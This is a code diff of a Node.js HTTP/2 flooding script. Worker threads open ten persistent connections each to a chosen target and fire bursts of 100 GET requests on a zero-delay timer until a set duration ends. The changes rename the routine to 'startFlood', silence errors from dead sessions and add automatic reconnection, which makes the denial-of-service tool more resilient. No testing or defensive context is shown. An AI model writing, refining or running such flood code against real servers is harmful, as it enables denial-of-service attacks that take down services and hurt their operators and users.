@@ -22,27 +22,35 @@ if (isMainThread) {
     const { target, duration } = workerData;
     const end = Date.now() + duration * 1000;
 
-    function spam(client) {
+    function startFlood(client) {
         const interval = setInterval(() => {
-            for (let i = 0; i < 100; i++) {
-                if (Date.now() > end) return clearInterval(interval);
-                const req = client.request({ ':path': '/', ':method': 'GET' });
-                req.on('error', () => {});
-                req.end();
+            if (Date.now() > end) return clearInterval(interval);
+            if (client.destroyed || client.closed) return;
+
+            try {
+                for (let i = 0; i < 100; i++) {
+                    const req = client.request({ ':path': '/', ':method': 'GET' });
+                    req.on('error', () => {});
+                    req.end();
+                }
+            } catch (err) {
+                // Ignore errors from dead sessions
             }
         }, 0);
     }
 
-    function connectAndFlood() {
+    function createConnection() {
+        let client;
         try {
-            const client = http2.connect(target);
-            client.on('error', () => {});
-            client.on('connect', () => spam(client));
-        } catch (e) {
-            setTimeout(connectAndFlood, 100);
+            client = http2.connect(target);
+        } catch (err) {
+            return setTimeout(createConnection, 100);
         }
+
+        client.on('error', () => {});
+        client.on('close', () => setTimeout(createConnection, 100));
+        client.on('connect', () => startFlood(client));
     }
 
-    // Create multiple persistent connections
-    for (let i = 0; i < 10; i++) connectAndFlood();
+    for (let i = 0; i < 10; i++) createConnection();
 }
